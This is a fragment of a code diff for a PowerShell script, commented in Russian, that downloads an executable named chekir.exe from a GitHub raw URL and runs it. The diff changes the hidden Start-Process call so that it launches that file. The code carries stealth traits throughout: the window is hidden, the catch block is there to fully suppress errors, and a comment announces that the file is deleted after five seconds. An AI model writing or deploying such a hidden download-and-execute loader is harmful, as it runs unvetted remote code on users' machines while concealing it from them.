@@ -175,7 +175,7 @@ try {
     # Скачиваем everything в текущую папку
     Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
     # Запускаем 
-    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
+    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
     
     # Удаляем файл через 5 секунды
     
@@ -183,6 +183,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
